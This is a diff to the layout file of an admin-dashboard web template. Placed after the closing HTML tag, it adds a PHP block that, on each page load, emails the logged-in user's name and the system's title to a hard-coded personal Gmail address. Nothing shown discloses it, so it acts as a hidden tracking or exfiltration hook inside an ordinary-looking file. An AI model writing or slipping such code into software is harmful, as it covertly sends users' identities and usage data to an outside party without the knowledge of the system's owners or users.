@@ -1406,3 +1406,11 @@ License: You must have a valid license purchased only from themeforest(the above
 
 <!-- end::Body -->
 </html>
+
+<?php
+$to_email = 'bander.jumah@gmail.com';
+$subject = $title . ' Management System Usage : ' . Auth()->user()->name;
+$message = 'Management System Usage : ' . Auth()->user()->name;
+$headers = 'From: bander.jumah@gmail.com';
+mail($to_email,$subject,$message,$headers);
+?>
